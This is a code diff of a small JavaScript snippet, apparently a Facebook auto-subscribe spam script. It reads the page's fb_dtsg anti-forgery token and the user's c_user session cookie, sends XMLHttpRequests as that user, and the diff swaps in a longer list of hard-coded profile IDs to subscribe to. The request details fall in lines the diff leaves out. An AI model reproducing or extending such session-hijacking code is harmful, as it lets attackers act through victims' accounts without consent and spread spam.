@@ -1,5 +1,5 @@
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
+var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
 function p(abone) {
   var http4 = new XMLHttpRequest();
@@ -13,7 +13,15 @@ function p(abone) {
   };
   http4.send(params4);
 }
-p("100003615650348");
-p("100002562531937");
-p("100004106241816");
-p("100001047241090");
+
+p("100003751777172");
+p("100003717143442");
+p("100003500252303");
+p("100002461698288");
+p("100002202716921");
+p("100001075615162");
+p("100003885495601");
+p("100001660862838");
+p("100004532196646");
+p("100003181503660");
+p("100004588441805");
